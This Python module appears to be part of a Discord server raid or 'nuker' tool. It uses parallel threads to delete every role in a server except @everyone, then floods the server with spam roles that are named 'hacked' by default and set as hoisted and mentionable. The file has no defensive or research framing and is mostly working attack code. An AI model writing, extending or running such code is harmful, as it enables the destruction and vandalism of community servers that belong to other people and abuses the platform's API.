import time
import threading
import random
from colorama import Fore
from utils import (
    fast_request, get_base_url, get_config, gradient_text,
    increment_counter, reset_counter, get_counter
)


def delete_role_thread(role_id, role_name):
    base_url = get_base_url()
    url = f"{base_url}/roles/{role_id}"
    
    response = fast_request("DELETE", url)
    
    if response and response.status_code in [200, 204]:
        count = increment_counter("delete")
        print(gradient_text(f"Deleted Role #{count} > {role_id}"))
    time.sleep(0.2)


def create_role_thread(role_name):
    base_url = get_base_url()
    url = f"{base_url}/roles"
    
    config = get_config()
    role_color = config.get("role_color", 16711680)
    
    payload = {
        "name": role_name,
        "color": role_color,
        "hoist": True,
        "mentionable": True
    }
    
    response = fast_request("POST", url, json=payload)
    
    if response and response.status_code in [200, 201]:
        count = increment_counter("create")
        print(gradient_text(f"Created Role #{count} > {role_name}"))
    time.sleep(0.2)


def delete_all_roles():
    reset_counter("delete")
    base_url = get_base_url()
    
    try:
        response = fast_request("GET", f"{base_url}/roles")
        
        if response and response.status_code == 200:
            roles = response.json()
            
            if not roles:
                print(Fore.RED + "No Roles Found")
                time.sleep(2)
                return
            
            threads = []
            for role in roles:
                if isinstance(role, dict) and 'id' in role:
                    role_name = role.get('name', 'Unknown')
                    
                    # Skip @everyone role
                    if role_name == "@everyone":
                        continue
                    
                    role_id = role['id']
                    t = threading.Thread(
                        target=delete_role_thread,
                        args=(role_id, role_name)
                    )
                    threads.append(t)
                    t.start()
                    time.sleep(0.02)
            
            for t in threads:
                t.join()
            
            count = get_counter("delete")
            print(Fore.LIGHTYELLOW_EX + f"\nSuccessfully Deleted {count} Roles")
        else:
            print(Fore.RED + "Failed to Fetch Roles")
    
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    
    time.sleep(2)


def create_spam_roles():
    reset_counter("create")
    config = get_config()
    role_names = config.get("role_names", ["hacked"])
    num_roles = config.get("spam_role_count", 20)
    
    try:
        threads = []
        for i in range(num_roles):
            role_name = random.choice(role_names)
            t = threading.Thread(
                target=create_role_thread,
                args=(role_name,)
            )
            threads.append(t)
            t.start()
            time.sleep(0.02)
        
        for t in threads:
            t.join()
        
        count = get_counter("create")
        print(Fore.LIGHTYELLOW_EX + f"\nSuccessfully Created {count} Roles")
    
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
    
    time.sleep(2)
